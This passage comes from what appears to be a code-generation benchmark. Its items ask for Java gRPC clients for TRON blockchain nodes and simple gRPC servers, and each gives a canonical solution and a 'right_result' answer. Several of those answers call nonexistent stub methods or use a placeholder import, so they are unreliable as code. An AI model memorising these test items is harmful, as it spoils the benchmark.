}\n    }\n}\n```"
  },
  {
    "Task_id": 500,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to both full and solidity nodes of a blockchain network, allowing for transaction creation and broadcasting.\n\nClass Description: The GrpcClient class establishes gRPC connections to blockchain nodes (full and solidity) and provides methods for transaction operations. It manages channel lifecycle and provides blocking stub interfaces for synchronous communication.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubExtension: [WalletExtensionGrpc.WalletExtensionBlockingStub] - Blocking stub for extension operations\n\nMethods:\n- GrpcClient(String fullnode, String soliditynode) -> [void] - Constructor that initializes connections to specified nodes\n- shutdown() -> [void] - Gracefully shuts down all active channels\n- createTransaction(AccountUpdateContract contract) -> [Transaction] - Creates a transaction using the full node stub\n- broadcastTransaction(Transaction signaturedTransaction) -> [boolean] - Broadcasts a signed transaction and returns operation result",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\nimport org.tron.api.WalletExtensionGrpc;\n\npublic class GrpcClient {\n\n  private ManagedChannel channelFull = null;\n  private ManagedChannel channelSolidity = null;\n  private WalletGrpc.WalletBlockingStub blockingStubFull = null;\n  private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity = null;\n  private WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension = null;\n\n  public GrpcClient(String fullnode, String soliditynode) {\n    if (!(fullnode.isEmpty())) {\n      channelFull = ManagedChannelBuilder.forTarget(fullnode)\n          .usePlaintext()\n          .build();\n      blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n    }\n    if (!(soliditynode.isEmpty())) {\n      channelSolidity = ManagedChannelBuilder.forTarget(soliditynode)\n          .usePlaintext()\n          .build();\n      blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n      blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelSolidity);\n    }\n  }\n\n  public void shutdown() throws InterruptedException {\n    if (channelFull != null) {\n      channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n    if (channelSolidity != null) {\n      channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n  }\n\n  public Transaction createTransaction(AccountUpdateContract contract) {\n    return blockingStubFull.updateAccount(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signaturedTransaction) {\n    GrpcAPI.Return response = blockingStubFull.broadcastTransaction(signaturedTransaction);\n    return response.getResult();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\n\npublic class GrpcClient {\n    private final ManagedChannel channelFull;\n    private final ManagedChannel channelSolidity;\n    private final WalletGrpc.WalletBlockingStub blockingStubFull;\n    private final WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private final WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension;\n\n    public GrpcClient(String fullnode, String soliditynode) {\n        this.channelFull = ManagedChannelBuilder.forTarget(fullnode)\n                .usePlaintext()\n                .build();\n        this.blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n\n        this.channelSolidity = ManagedChannelBuilder.forTarget(soliditynode)\n                .usePlaintext()\n                .build();\n        this.blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        this.blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelFull);\n    }\n\n    public void shutdown() throws InterruptedException {\n        channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n\n    public Transaction createTransaction(AccountUpdateContract contract) {\n        return blockingStubFull.createTransaction(contract);\n    }\n\n    public boolean broadcastTransaction(Transaction signedTransaction) {\n        BroadcastResponse response = blockingStubFull.broadcastTransaction(signedTransaction);\n        return response.getResult() == ResponseCode.SUCCESS.getNumber();\n    }\n}\n```"
  },
  {
    "Task_id": 501,
    "Instruction": "Task Description: Create a gRPC client class in Java for interacting with a Tron blockchain wallet service, implementing various wallet operations through gRPC calls.\n\nClass Description: The WalletGrpcClient class provides a Java interface to interact with a Tron blockchain node's wallet service using gRPC. It handles connection management and provides methods for account queries, transaction creation, and blockchain data retrieval.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- walletBlockingStub: [WalletGrpc.WalletBlockingStub] - The blocking stub for making synchronous RPC calls\n\nMethods:\n- WalletGrpcClient(String host, int port) - Constructor - Creates a client connecting to specified host and port\n- WalletGrpcClient(String host) - Constructor - Creates a client connecting to specified host (using target format)\n- shutdown() -> void - Shuts down the channel with 5-second timeout\n- queryAccount(byte[] address) -> Account - Queries account information by address\n- createTransaction(TransferContract contract) -> Transaction - Creates a transfer transaction\n- createTransferAssetTransaction(TransferAssetContract contract) -> Transaction - Creates an asset transfer transaction\n- createParticipateAssetIssueTransaction(ParticipateAssetIssueContract contract) -> Transaction - Creates an asset participation transaction\n- createAssetIssue(AssetIssueContract contract) -> Transaction - Creates an asset issuance transaction\n- voteWitnessAccount(VoteWitnessContract contract) -> Transaction - Creates a witness voting transaction\n- createWitness(WitnessCreateContract contract) -> Transaction - Creates a witness creation transaction\n- broadcastTransaction(Transaction signedTransaction) -> boolean - Broadcasts a signed transaction to network\n- getBlock(long blockNum) -> Block - Retrieves block by number (or latest if negative)\n- listNodes() -> Optional<NodeList> - Lists connected nodes\n- getAssetIssueByAccount(byte[] address) -> Optional<AssetIssueList> - Gets assets issued by account\n- getAssetIssueByName(String assetName) -> AssetIssueContract - Gets asset by name\n- getAssetIssueListByName(String assetName) -> Optional<AssetIssueList> - Gets asset list by name\n- getAssetIssueById(String assetId) -> AssetIssueContract - Gets asset by ID",
    "Canonical_solution": "import com.google.protobuf.ByteString;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.Optional;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI.AssetIssueList;\nimport org.tron.api.GrpcAPI.BytesMessage;\nimport org.tron.api.GrpcAPI.EmptyMessage;\nimport org.tron.api.GrpcAPI.NodeList;\nimport org.tron.api.GrpcAPI.NumberMessage;\nimport org.tron.api.GrpcAPI.Return;\nimport org.tron.api.WalletGrpc;\nimport org.tron.protos.Protocol.Account;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.protos.Protocol.Transaction;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.AssetIssueContract;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.ParticipateAssetIssueContract;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.TransferAssetContract;\nimport org.tron.protos.contract.BalanceContract.TransferContract;\nimport org.tron.protos.contract.WitnessContract.VoteWitnessContract;\nimport org.tron.protos.contract.WitnessContract.WitnessCreateContract;\n\npublic class WalletGrpcClient {\n\n  private final ManagedChannel channel;\n  private final WalletGrpc.WalletBlockingStub walletBlockingStub;\n\n  public WalletGrpcClient(String host, int port) {\n    channel = ManagedChannelBuilder.forAddress(host, port)\n        .usePlaintext()\n        .build();\n    walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n  }\n\n  public WalletGrpcClient(String host) {\n    channel = ManagedChannelBuilder.forTarget(host)\n        .usePlaintext()\n        .build();\n    walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public Account queryAccount(byte[] address) {\n    ByteString addressByteString = ByteString.copyFrom(address);\n    Account request = Account.newBuilder().setAddress(addressByteString).build();\n    return walletBlockingStub.getAccount(request);\n  }\n\n  public Transaction createTransaction(TransferContract contract) {\n    return walletBlockingStub.createTransaction(contract);\n  }\n\n  public Transaction createTransferAssetTransaction(TransferAssetContract contract) {\n    return walletBlockingStub.transferAsset(contract);\n  }\n\n  public Transaction createParticipateAssetIssueTransaction(\n      ParticipateAssetIssueContract contract) {\n    return walletBlockingStub.participateAssetIssue(contract);\n  }\n\n  public Transaction createAssetIssue(AssetIssueContract contract) {\n    return walletBlockingStub.createAssetIssue(contract);\n  }\n\n  public Transaction voteWitnessAccount(VoteWitnessContract contract) {\n    return walletBlockingStub.voteWitnessAccount(contract);\n  }\n\n  public Transaction createWitness(WitnessCreateContract contract) {\n    return walletBlockingStub.createWitness(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signedTransaction) {\n    Return response = walletBlockingStub.broadcastTransaction(signedTransaction);\n    return response.getResult();\n  }\n\n  public Block getBlock(long blockNum) {\n    if (blockNum < 0) {\n      return walletBlockingStub.getNowBlock(EmptyMessage.newBuilder().build());\n    }\n    NumberMessage.Builder builder = NumberMessage.newBuilder();\n    builder.setNum(blockNum);\n    return walletBlockingStub.getBlockByNum(builder.build());\n  }\n\n  public Optional<NodeList> listNodes() {\n    NodeList nodeList = walletBlockingStub\n        .listNodes(EmptyMessage.newBuilder().build());\n    if (nodeList != null) {\n      return Optional.of(nodeList);\n    }\n    return Optional.empty();\n  }\n\n  public Optional<AssetIssueList> getAssetIssueByAccount(byte[] address) {\n    ByteString addressByteString = ByteString.copyFrom(address);\n    Account request = Account.newBuilder().setAddress(addressByteString).build();\n    AssetIssueList assetIssueList = walletBlockingStub\n        .getAssetIssueByAccount(request);\n    if (assetIssueList != null) {\n      return Optional.of(assetIssueList);\n    }\n    return Optional.empty();\n  }\n\n  public AssetIssueContract getAssetIssueByName(String assetName) {\n    ByteString assetNameBs = ByteString.copyFrom(assetName.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetNameBs).build();\n    return walletBlockingStub.getAssetIssueByName(request);\n  }\n\n  public Optional<AssetIssueList> getAssetIssueListByName(String assetName) {\n    ByteString assetNameBs = ByteString.copyFrom(assetName.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetNameBs).build();\n\n    AssetIssueList assetIssueList = walletBlockingStub\n        .getAssetIssueListByName(request);\n    if (assetIssueList != null) {\n      return Optional.of(assetIssueList);\n    }\n    return Optional.empty();\n  }\n\n  public AssetIssueContract getAssetIssueById(String assetId) {\n    ByteString assetIdBs = ByteString.copyFrom(assetId.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetIdBs).build();\n    return walletBlockingStub.getAssetIssueById(request);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.Optional;\nimport org.tron.protos.Contract.*;\nimport org.tron.protos.Protocol.*;\n\npublic class WalletGrpcClient {\n    private final ManagedChannel channel;\n    private final WalletGrpc.WalletBlockingStub walletBlockingStub;\n\n    public WalletGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        this.walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpcClient(String target) {\n        this.channel = ManagedChannelBuilder.forTarget(target).usePlaintext().build();\n        this.walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public void shutdown() throws InterruptedException {\n        channel.shutdown().awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS);\n    }\n\n    public Account queryAccount(byte[] address) {\n        return walletBlockingStub.getAccount(AccountQuery.newBuilder().setAddress(ByteString.copyFrom(address)).build());\n    }\n\n    public Transaction createTransaction(TransferContract contract) {\n        return walletBlockingStub.createTransaction(contract);\n    }\n\n    public Transaction createTransferAssetTransaction(TransferAssetContract contract) {\n        return walletBlockingStub.createTransaction(contract);\n    }\n\n    public Transaction createParticipateAssetIssueTransaction(ParticipateAssetIssueContract contract) {\n        return walletBlockingStub.createTransaction(contract);\n    }\n\n    public Transaction createAssetIssue(AssetIssueContract contract) {\n        return walletBlockingStub.createTransaction(contract);\n    }\n\n    public Transaction voteWitnessAccount(VoteWitnessContract contract) {\n        return walletBlockingStub.createTransaction(contract);\n    }\n\n    public Transaction createWitness(WitnessCreateContract contract) {\n        return walletBlockingStub.createTransaction(contract);\n    }\n\n    public boolean broadcastTransaction(Transaction signedTransaction) {\n        return walletBlockingStub.broadcastTransaction(signedTransaction).getResult();\n    }\n\n    public Block getBlock(long blockNum) {\n        return walletBlockingStub.getBlockById(BlockId.newBuilder().setNum(blockNum).build());\n    }\n\n    public Optional<NodeList> listNodes() {\n        NodeList nodeList = walletBlockingStub.listNodes(NodeList.newBuilder().build());\n        if (nodeList != null && nodeList.getNodeCount() > 0) {\n            return Optional.of(nodeList);\n        }\n        return Optional.empty();\n    }\n\n    public Optional<AssetIssueList> getAssetIssueByAccount(byte[] address) {\n        AssetIssueList assetIssueList = walletBlockingStub.getAssetIssueByAccount(\n                ByteString.copyFrom(address));\n        if (assetIssueList != null && assetIssueList.getAssetIssueCount() > 0) {\n            return Optional.of(assetIssueList);\n        }\n        return Optional.empty();\n    }\n\n    public AssetIssueContract getAssetIssueByName(String assetName) {\n        return walletBlockingStub.getAssetIssueByName(AssetIssueContract.newBuilder().setName(assetName).build());\n    }\n\n    public Optional<AssetIssueList> getAssetIssueListByName(String assetName) {\n        AssetIssueList assetIssueList = walletBlockingStub.getAssetIssueListByName(\n                AssetIssueContract.newBuilder().setName(assetName).build());\n        if (assetIssueList != null && assetIssueList.getAssetIssueCount() > 0) {\n            return Optional.of(assetIssueList);\n        }\n        return Optional.empty();\n    }\n\n    public AssetIssueContract getAssetIssueById(String assetId) {\n        return walletBlockingStub.getAssetIssueById(AssetIssueContract.newBuilder().setId(assetId).build());\n    }\n}\n```"
  },
  {
    "Task_id": 503,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for establishing and managing connections to a gRPC server, with methods to start the connection, retrieve the blocking stub, and shutdown the connection.\n\nClass Description: The GrpcClient class provides functionality to connect to a gRPC server using a ManagedChannel, create a blocking stub for synchronous communication, and properly shutdown the connection when done.\n\nAttributes:\n- channel: [ManagedChannel] - The channel used to communicate with the gRPC server\n- blockingStub: [WalletGrpc.WalletBlockingStub] - The blocking stub used to make synchronous RPC calls\n\nMethods:\n- startConnection(String host, int port) -> void - Establishes a connection to the gRPC server at the specified host and port, creating both the ManagedChannel and blocking stub\n- getBlockingStub() -> WalletGrpc.WalletBlockingStub - Returns the blocking stub for making RPC calls\n- shutdown() -> void - Shuts down the channel connection, waiting for up to 5 seconds for termination",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.api.WalletGrpc;\nimport java.util.concurrent.TimeUnit;\n\npublic class GrpcClient {\n\n    private ManagedChannel channel;\n    private WalletGrpc.WalletBlockingStub blockingStub;\n\n    public void startConnection(String host, int port) {\n        channel = ManagedChannelBuilder.forAddress(host, port)\n            .usePlaintext()\n            .build();\n        blockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpc.WalletBlockingStub getBlockingStub() {\n        return blockingStub;\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (channel != null) {\n            channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport java.util.concurrent.TimeUnit;\nimport your.package.name.WalletGrpc;\n\npublic class GrpcClient {\n    private ManagedChannel channel;\n    private WalletGrpc.WalletBlockingStub blockingStub;\n\n    public void startConnection(String host, int port) {\n        channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        blockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpc.WalletBlockingStub getBlockingStub() {\n        return blockingStub;\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            try {\n                channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                throw new StatusRuntimeException(io.grpc.Status.fromThrowable(e));\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 505,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with multiple TRON blockchain nodes (full node, solidity node, and PBFT node) to retrieve block information.\n\nClass Description: The GrpcClient class provides functionality to connect to different types of TRON blockchain nodes using gRPC protocol and retrieve block data from them. It manages multiple channel connections and provides blocking stub interfaces for synchronous calls.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- channelpBFT: [ManagedChannel] - Channel for connection to the PBFT node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubpBFT: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for PBFT node operations\n\nMethods:\n- init: [void]([String fullnode, String solidityNode, String pBFTNode]) -> [void] - Initializes connections to all three node types by creating channels and stubs\n- getBlockFromFullNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the full node by block number\n- getBlockFromSolidityNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the solidity node by block number\n- getBlockFromPBFTNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the PBFT node by block number\n- shutdown: [void]([]) -> [void] - Gracefully shuts down all channel connections with a 5-second timeout",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\n\npublic class GrpcClient {\n\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelpBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubpBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode)\n                .usePlaintext()\n                .build();\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode)\n                .usePlaintext()\n                .build();\n        channelpBFT = ManagedChannelBuilder.forTarget(pBFTNode)\n                .usePlaintext()\n                .build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubpBFT = WalletSolidityGrpc.newBlockingStub(channelpBFT);\n    }\n\n    public GrpcAPI.Block getBlockFromFullNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubFull.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromSolidityNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubSolidity.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromPBFTNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubpBFT.getBlockByNum(message);\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (channelFull != null) {\n            channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelpBFT != null) {\n            channelpBFT.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.api.GrpcAPI;\nimport org.tron.protos.Wallet;\nimport org.tron.protos.WalletSolidity;\n\npublic class GrpcClient {\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelPBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubPBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode).usePlaintext().build();\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode).usePlaintext().build();\n        channelPBFT = ManagedChannelBuilder.forTarget(pBFTNode).usePlaintext().build();\n\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubPBFT = WalletSolidityGrpc.newBlockingStub(channelPBFT);\n    }\n\n    public GrpcAPI.Block getBlockFromFullNode(long blockNum) {\n        return blockingStubFull.getBlockByNum(blockNum);\n    }\n\n    public GrpcAPI.Block getBlockFromSolidityNode(long blockNum) {\n        return blockingStubSolidity.getBlockByNum(blockNum);\n    }\n\n    public GrpcAPI.Block getBlockFromPBFTNode(long blockNum) {\n        return blockingStubPBFT.getBlockByNum(blockNum);\n    }\n\n    public void shutdown() {\n        try {\n            if (channelFull != null) channelFull.shutdown().awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS);\n            if (channelSolidity != null) channelSolidity.shutdown().awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS);\n            if (channelPBFT != null) channelPBFT.shutdown().awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 506,
    "Instruction": "Task Description: Implement a gRPC server in Java that handles streaming requests and responses, following the structure and functionality of the provided reference code.\n\nClass Description: The HelloWorldServer class represents a gRPC server that listens on a specified port and provides a streaming greeting service. It manages server lifecycle operations (start, stop, await termination) and implements the gRPC service interface for handling client requests.\n\nAttributes:\n- server: [Server] - The gRPC server instance that handles incoming requests\n- logger: [Logger] - Logger instance for server activity logging\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the specified port (50051 by default) and registers a shutdown hook for graceful termination. Throws IOException if server fails to start.\n- stop() -> [void] - Initiates graceful shutdown of the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the calling thread until the server terminates. Throws InterruptedException if the thread is interrupted while waiting.\n\nNested Class:\n- GreeterImpl: [StreamingGreeterGrpc.StreamingGreeterImplBase] - Implements the gRPC service interface with streaming capabilities\n  Methods:\n  - sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) -> [void] - Handles client requests by sending multiple greeting responses in a stream. Takes a HelloRequest containing the client's name and a StreamObserver for sending responses. Sends three greeting messages with increasing excitement, then completes the stream.",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.examples.streaming.HelloReply;\nimport io.grpc.examples.streaming.HelloRequest;\nimport io.grpc.examples.streaming.StreamingGreeterGrpc;\nimport io.grpc.stub.StreamObserver;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n  private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n  private Server server;\n\n  public void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new GreeterImpl()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread() {\n              @Override\n              public void run() {\n                System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                HelloWorldServer.this.stop();\n                System.err.println(\"*** server shut down\");\n              }\n            });\n  }\n\n  public void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  public void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  static class GreeterImpl extends StreamingGreeterGrpc.StreamingGreeterImplBase {\n    @Override\n    public void sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n      try {\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build());\n        Thread.sleep(100);\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName() + \"!\").build());\n        Thread.sleep(100);\n        logger.info(\"Saying hi\");\n        responseObserver.onNext(\n            HelloReply.newBuilder().setMessage(\"Hello \" + req.getName() + \"!!\").build());\n      } catch (InterruptedException e) {\n        responseObserver.onError(e);\n      } finally {\n        responseObserver.onCompleted();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.stub.StreamObserver;\n\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n    private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n    private Server server;\n\n    private int port = 50051;\n\n    private void start() throws IOException {\n        server = ServerBuilder.forPort(port)\n                .addService(new GreeterImpl())\n                .build()\n                .start();\n        logger.info(\"Server started, listening on \" + port);\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            System.err.println(\"*** Shutdown Hook Triggered ***\");\n            HelloWorldServer.this.stop();\n        }));\n    }\n\n    private void stop() {\n        if (server != null) {\n            server.shutdown();\n            logger.info(\"Server stopped.\");\n        }\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        final HelloWorldServer server = new HelloWorldServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n\n    static class GreeterImpl extends StreamingGreeterGrpc.StreamingGreeterImplBase {\n        @Override\n        public void sayHelloStreaming(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n            String name = req.getName();\n            for (int i = 1; i <= 3; i++) {\n                HelloReply reply = HelloReply.newBuilder()\n                        .setMessage(\"Hello, \" + name + \"! \".repeat(i))\n                        .build();\n                responseObserver.onNext(reply);\n            }\n            responseObserver.onCompleted();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 508,
    "Instruction": "Task Description: Implement a gRPC server in Java that listens for incoming requests and provides book-related services. The server should start on a specified port, handle graceful shutdown, and wait for termination.\n\nClass Description: The BookServer class represents a gRPC server implementation that hosts book-related services. It manages server lifecycle including startup, shutdown, and termination waiting.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the default port (50051) and registers the BookService. Also adds a shutdown hook for graceful termination.\n- stop() -> [void] - Initiates a graceful shutdown of the gRPC server if it's running.\n- blockUntilShutdown() -> [void] - Blocks the main thread until the server is terminated.\n- main(String[] args) -> [void] - Entry point that creates and starts the server, then waits for shutdown. Throws IOException and InterruptedException.\n\nThe class follows gRPC server best practices including:\n1. Using ServerBuilder to create and configure the server\n2. Adding services before starting\n3. Implementing graceful shutdown\n4. Proper error handling\n5. Logging server status",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class BookServer {\n  private static final Logger logger = Logger.getLogger(BookServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new BookService()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread(\n                () -> {\n                  System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                  BookServer.this.stop();\n                  System.err.println(\"*** server shut down\");\n                }));\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final BookServer server = new BookServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class BookServer {\n    private static final Logger logger = Logger.getLogger(BookServer.class.getName());\n    private Server server;\n\n    private void start() throws IOException {\n        int port = 50051;\n        server = ServerBuilder.forPort(port)\n                .addService(new BookService())\n                .build()\n                .start();\n        logger.info(\"Server started, listening on \" + port);\n\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            logger.info(\"*** Shutdown hook triggered. Shutting down gRPC server gracefully.\");\n            stop();\n        }));\n    }\n\n    private void stop() {\n        if (server != null) {\n            server.shutdown();\n            logger.info(\"Server is shutting down.\");\n        }\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        final BookServer server = new BookServer();\n        server.start();\n        